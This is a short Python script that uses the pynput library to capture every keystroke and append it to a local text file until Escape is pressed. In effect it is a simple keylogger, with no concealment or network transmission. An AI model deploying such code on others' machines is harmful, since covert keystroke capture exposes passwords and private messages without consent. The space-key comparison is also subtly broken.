from pynput import keyboard

# Define the log file path
log_file_path = "key_log.txt"

# Function to handle key press events
def on_press(key):
    try:
        # Log the character pressed
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., shift, ctrl, etc.)
        with open(log_file_path, "a") as log_file:
            print(key)
            if key == "Key.space":
                log_file.write(f" ")
            else:
                log_file.write(f"{key}")

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when the escape key is released
        return False

# Start the listener to monitor keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
